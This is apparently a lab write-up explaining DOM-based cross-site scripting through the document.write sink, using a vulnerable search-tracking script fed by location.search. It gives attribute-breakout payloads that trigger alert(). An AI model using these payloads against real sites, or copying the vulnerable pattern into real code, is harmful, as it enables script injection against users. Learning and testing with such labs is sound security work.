### Exploiting DOM XSS with different sources and sinks

In principle, a website is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from source to sink. In practice, different sources and sinks have differing properties and behavior that can affect exploitability, and determine what techniques are necessary. Additionally, the website's scripts might perform validation or other processing of data that must be accommodated when attempting to exploit a vulnerability. There are a variety of sinks that are relevant to DOM-based vulnerabilities. Please refer to the list below for details.

The ```document.write``` sink works with ```script``` elements, so you can use a simple payload, such as the one below:

```document.write('... <script>alert(document.domain)</script> ...');```

Note, however, that in some situations the content that is written to document.write includes some surrounding context that you need to take account of in your exploit. For example, you might need to close some existing elements before using your JavaScript payload. 

### DOM XSS in document.write sink using source location.search

1 - Enter a random alphanumeric string into the search box.

2 - Right-click and inspect the element, and observe that your random string has been placed inside an img src attribute.

```js
<script>
function trackSearch(query) {
   document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
   if(query) {
      trackSearch(query);
}
</script>
```

3 - Break out of the img attribute by searching for:

```"><svg onload=alert(1)>```
or
```"><img src=x onerror=alert(1)>```

                    
